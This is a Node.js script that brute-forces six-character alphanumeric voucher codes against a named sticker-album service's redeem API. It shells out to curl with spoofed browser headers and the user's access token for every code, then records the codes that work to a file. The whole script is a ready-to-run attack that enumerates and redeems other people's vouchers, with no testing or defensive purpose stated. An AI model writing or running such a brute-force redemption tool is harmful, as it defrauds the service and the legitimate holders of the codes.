const fs = require('fs');
const path = require('path');
const child_process = require('child_process');

const { start, accessToken, outDir } = require('./parse-arguments')(process.argv);

const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
const alphabetLength = alphabet.length;

const input = start.toUpperCase();

let indexes = [
    alphabet.indexOf(input[0]),
    alphabet.indexOf(input[1]),
    alphabet.indexOf(input[2]),
    alphabet.indexOf(input[3]),
    alphabet.indexOf(input[4]),
    alphabet.indexOf(input[5])
];

function getNextIndexes(_indexes) {
    const result = [ ..._indexes ];

    result[5] = ++result[5] % alphabetLength;
    if(result[5] === 0) {
        result[4] = ++result[4] % alphabetLength;
        if(result[4] === 0) {
            result[3] = ++result[3] % alphabetLength;
            if(result[3] === 0) {
                result[2] = ++result[2] % alphabetLength;
                if(result[2] === 0) {
                    result[1] = ++result[1] % alphabetLength;
                    if(result[1] === 0) {
                        result[0] = ++result[0] % alphabetLength;
                        if(result[0] === 0) {
                            console.log('Finished');
                            process.exit(0);
                        }
                    }
                }
            }
        }
    }

    return result;
}


const fsCb = (err) => {
    if(err) {
        console.error(err);
    }
};

async function runCmd(data) {
    return new Promise((resolve, reject) => {
        const cmd = `curl 'http://api.fantom.tv/SW17/vouchers/redeem?albumKey=SW17&accessToken=${accessToken}&currentUrl=aHR0cDovL3d3dy5mYW50b20udHYvc3cxNw==' -H 'Origin: http://www.fantom.tv' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: es' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: http://www.fantom.tv/sw17' -H 'Connection: keep-alive' --data $'data%5BVoucher%5D%5Bcode%5D=${data}+alphabet+%3D+\'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\'' --compressed`;
        child_process.exec(cmd, (err, resp) => {
            if(err) {
                reject(err);
            } else {
                try {
                    const result = JSON.parse(resp.toString('UTF8'));
                    resolve(result);
                } catch (e) {
                    reject(e);
                }
            }
        });
    });
}

async function tryVoucher(voucher) {
    let result = null;
    try {
        result = await runCmd(voucher);
        if(result.success) {
            console.log(`✅ ${voucher}`);
            fs.appendFile(`${outDir}validCodes.txt`, voucher + "\n", fsCb);
        } else {
            console.log(`❎ ${voucher}`);
            fs.appendFile(`${outDir}invalidCodes.txt`, voucher + "\n", fsCb);
        }

        fs.writeFile(`${outDir}lastCode.txt`, voucher, fsCb);
    } catch(e) {
        console.error(`Error processing ${voucher}`);
        console.error(e);
        console.error(result);
        fs.writeFile(`${outDir}unprocessedCodes.txt`, voucher, fsCb);

        return new Promise((resolve, reject) => {
            setTimeout(() => {
                console.log('Waiting 5 seconds...');
            }, 5000);
        });
    }
}

(async function(){
    while(true) {
        await tryVoucher(`${alphabet[indexes[0]]}${alphabet[indexes[1]]}${alphabet[indexes[2]]}${alphabet[indexes[3]]}${alphabet[indexes[4]]}${alphabet[indexes[5]]}`);
        indexes = getNextIndexes(indexes);
    }
})();